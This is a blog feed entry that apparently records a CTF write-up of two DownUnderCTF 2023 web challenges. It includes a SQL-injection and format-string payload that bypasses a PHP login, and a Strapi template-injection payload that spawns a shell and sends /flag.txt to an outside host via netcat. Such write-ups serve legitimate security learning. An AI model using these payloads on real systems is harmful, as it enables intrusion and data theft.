<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zhong&#39;s Blog</title>
  
  <subtitle>Welcome to</subtitle>
  <link href="https://www.2h0ng.wiki/atom.xml" rel="self"/>
  
  <link href="https://www.2h0ng.wiki/"/>
  <updated>2023-09-04T00:15:51.144Z</updated>
  <id>https://www.2h0ng.wiki/</id>
  
  <author>
    <name>Jiacheng Zhong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>What I learned from - downunderctf 2023- Web Section</title>
    <link href="https://www.2h0ng.wiki/2023/09/03/What%20I%20learned%20from%20-%20downunderctf%20-%20Web%20Section%202023/"/>
    <id>https://www.2h0ng.wiki/2023/09/03/What%20I%20learned%20from%20-%20downunderctf%20-%20Web%20Section%202023/</id>
    <published>2023-09-03T22:25:56.000Z</published>
    <updated>2023-09-04T00:15:51.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Smooth-Jazz"><a href="#Smooth-Jazz" class="headerlink" title="Smooth Jazz"></a>Smooth Jazz</h1><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Prerequisite-knowledge"><a href="#Prerequisite-knowledge" class="headerlink" title="Prerequisite knowledge"></a>Prerequisite knowledge</h2><ul><li><p>Mysql engine <strong>truncates</strong> string from the beginning of an invalid UTF8-encoding character.</p></li><li><p>Familiarity with the <strong>format</strong> parameter and the behavior of the <strong>vsprintf</strong> function in PHP.</p><ul><li><p><code>vsprintf(string $format, mixed ...$values): string</code></p><ul><li><p><strong>Format parameter</strong>: </p><ul><li><p><code>%[argnum$][flags][width][.precision][specifier]</code></p><ul><li><p>Example: <code>%1$&#39;as</code></p><blockquote><p><strong>%</strong>: starting symbol</p><p><strong>1$</strong>: [argnums$] :match the first value from values that are passed in.</p><p><strong>‘a</strong>: one option of the [flags] -&gt; ‘(char): Replace blank with ‘a’ to pad the result string. For example, when [width] is set to 100 and the real length of the formatting string is only 5, the rest of the 95 characters would be padded with the letter ‘a’.</p><p><strong>s</strong>: [specifier]: specify the data type for each data from inputted values. <code>%</code> is also a specifier, used for output real <code>%</code>, which is a tricky one for <u>smuggling</u> a new token by combining it with the <strong>htmlspecialchars</strong> function.</p></blockquote></li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /</span><br><span class="line"></span><br><span class="line">username=admin%ff%251$c%23+%251$&#x27;&gt;%25s&amp;password=668</span><br></pre></td></tr></table></figure><ul><li><p><strong>%ff</strong>: truncates string after “admin”. From the Mysql engine’s perspective, <u>all the input characters are already determined as “admin”</u>.</p></li><li><p><strong>%251$c</strong> (URL DECODING)-&gt; <strong>%1$c</strong>: a positional specifier tricks the sprints function to format string as we want. In other words, it controls the real transfer stream and achieves our expectations by combining with the password value.</p><p>why we can’t directly use %c to format the password field is that formatting a string usually works in order, rendering each item of an input array perspectively to each place of specifier. So we need to specify which data to render, avoiding the error.</p><blockquote><p>PHP Fatal error:  Uncaught ValueError: The arguments array must contain 2 items, 1 given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3\nStack trace:\n#0 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(3): vsprintf()</p></blockquote></li><li><p><strong>password&#x3D;668</strong>: cha1(668) &#x3D; 34cXXXXX. %34 represents a url-encoded <strong>double-quote</strong>. vsprintf(“%1$c”, 34) will generate a double-quote to exploit SQL Injection, <u>bypassing the password authentication</u>. </p></li><li><p><strong>%251$’&gt;%25s</strong> (URL DECODING)-&gt; <strong>%1$’&gt;%s</strong>:  the last step to do is get flag. Although we can not make the username totally match “admin”, we can inject a specifier as above to exfiltrate the second ‘FLAG’ formatting input. </p></li><li><p>To that end, there is a problem emerging. We can not pass two specifiers into the username field, since the previous vsprintf functions all only accept one input value. That means if we directly pass two specifiers in, it will cause a error from php interpreters as we discussed above. So the key point is to leverage <code>htmlspecialchars</code> function to “create a specifier” for us. That is what this payload did.</p></li><li><p>%1$’&gt;%s –htmlspecialchars–&gt;  %1$’&amp;gt;%s</p><ul><li>The first specifier: <strong>%1$’&amp;g</strong>: a floating point number, taking from position 1, using &amp; as padding char</li><li>followed by the string “t;”</li><li>The second specifier: <strong>%s</strong>: string taken from the 2nd position, that is where the FLAG is.</li></ul></li><li><p>That is how we arrived there.</p></li></ul><h1 id="Strapi-In"><a href="#Strapi-In" class="headerlink" title="Strapi In"></a>Strapi In</h1><p>STRAPI IN quick writeup : </p><p>step 1: create a  custom template with a reference id 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x=Object&#125;&#125;&#123;&#123;w=a=new x&#125;&#125;&#123;&#123;w.type=&quot;pipe&quot;&#125;&#125;&#123;&#123;w.readable=1&#125;&#125;&#123;&#123;w.writable=1&#125;&#125;&#123;&#123;a.file=&quot;/bin/sh&quot;&#125;&#125;&#123;&#123;a.args=[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;nc **YOUR_IP YOUR_PORT** &lt; /flag.txt&quot;]&#125;&#125;&#123;&#123;a.stdio=[w,w]&#125;&#125;&#123;&#123;process.binding(&quot;spawn_sync&quot;).spawn(a).output&#125;&#125;</span><br></pre></td></tr></table></figure><p>step 2: visit the url: <a href="https://web-strapi-in-6a0f1abf2bf0cbc0.2023.ductf.dev/api/sendtestemail/1">https://web-strapi-in-6a0f1abf2bf0cbc0.2023.ductf.dev/api/sendtestemail/1</a> </p><p><strong>for debug</strong></p><p><code>/opt/strapi-in/node_modules/strapi-plugin-email-designer/server/services/email.js:91:87</code></p><p><img src="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190236092.png" alt="image-20230902190236092"></p><p><img src="https://api.2h0ng.wiki/noteimages/2023/09/02/image-20230902190324305.png" alt="image-20230902190324305"></p><h2 id="mustache-template-with-Lodash-SSTI-payloads"><a href="#mustache-template-with-Lodash-SSTI-payloads" class="headerlink" title="mustache template with Lodash SSTI payloads"></a>mustache template with Lodash SSTI payloads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;= _.VERSION &#125;&#125;</span><br><span class="line">&#123;&#123;= _.templateSettings.evaluate &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://github.com/janl/mustache.js">https://github.com/janl/mustache.js</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.php.net/manual/en/function.sprintf.php#Specifiers">https://www.php.net/manual/en/function.sprintf.php#Specifiers</a></p><p><a href="https://www.php.net/manual/en/function.htmlspecialchars.php">https://www.php.net/manual/en/function.htmlspecialchars.php</a></p><p><a href="https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/web/smooth-jazz/solve/solution.py">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/web/smooth-jazz/solve/solution.py</a></p><p><a href="https://www.geeksforgeeks.org/lodash-_-template-method/">https://www.geeksforgeeks.org/lodash-_-template-method/</a></p><p><a href="https://twitter.com/rootxharsh/status/1268181937127997446?lang=en">https://twitter.com/rootxharsh/status/1268181937127997446?lang=en</a></p><p><a href="https://www.ghostccamm.com/blog/multi_strapi_vulns/">https://www.ghostccamm.com/blog/multi_strapi_vulns/</a></p><p><a href="https://lodash.com/docs/4.17.15#templateSettings">https://lodash.com/docs/4.17.15#templateSettings</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Smooth-Jazz&quot;&gt;&lt;a href=&quot;#Smooth-Jazz&quot; class=&quot;headerlink&quot; title=&quot;Smooth Jazz&quot;&gt;&lt;/a&gt;Smooth Jazz&lt;/h1&gt;&lt;h2 id=&quot;Source-Code&quot;&gt;&lt;a href=&quot;#Source</summary>
      
    
    
    
    <category term="Writeup" scheme="https://www.2h0ng.wiki/categories/Writeup/"/>
    
    
    <category term="ctf" scheme="https://www.2h0ng.wiki/tags/ctf/"/>
    
    <category term="downunderctf" scheme="https://www.2h0ng.wiki/tags/downunderctf/"/>
    
  </entry>
  
</feed>
